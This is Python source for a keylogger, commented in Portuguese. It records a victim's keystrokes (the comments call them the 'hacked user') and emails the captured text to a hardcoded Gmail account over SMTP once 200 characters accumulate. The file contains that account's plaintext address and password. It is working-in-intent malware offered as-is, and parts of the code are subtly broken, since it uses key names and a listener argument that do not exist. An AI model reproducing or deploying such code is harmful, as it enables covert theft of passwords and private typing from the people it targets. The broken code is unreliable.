#Importação necessária das bibliotecas.

import smtplib
import subprocess
from pynput.keyboard import Key, Listener

#O e-mail usado.

e_mail = 'pratazecada@gmail.com'
password = 'ednaldojr1701'

#Conexão com o servidor e porta.

server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(e_mail, password)

#Recebendo a resposta do usuário hackeado.

loginCompleto = ''
words = ''
limiteDeCaracterNoE_mail = 200

#Criando uma função de como o Kelogger irá funcionar.

def onPress(key):
    global words
    global e_mail
    global limiteDeCaracterNoE_mail
    global loginCompleto

#Método que irá avisar ao invasor se a tecla "Enter" ou "Espaço" for clicada.

    if key== key.space or key == key.enter:
        words+= ' '
        loginCompleto += words
        words = ' '

#Método que irá avisar ao invasor se o limite de caracter for atingido.

    if len(loginCompleto) >= limiteDeCaracterNoE_mail:
            sendLog()
            loginCompleto = ' '

#Método que irá avisar ao invasor se a tecla "Shift" tanto da esquerda ou direita for clicada.

    if key == key.shift_e or key == key.shift_d:
        return
    elif key == key.backspace:
        words = words[:-1]
    else:
        caracter = f'{key}'
        caracter = caracter[1:-1]
        words += caracter

#Irá avisar se o botão "Esc" for ativado.

    if key == Key.esc:
        return False

#Criando a função "send.log"

def sendLog():
    server.sendmail(
        e_mail,
        e_mail,
        loginCompleto
    )

with Listener(onPress=onPress) as listener:
    listener.join()
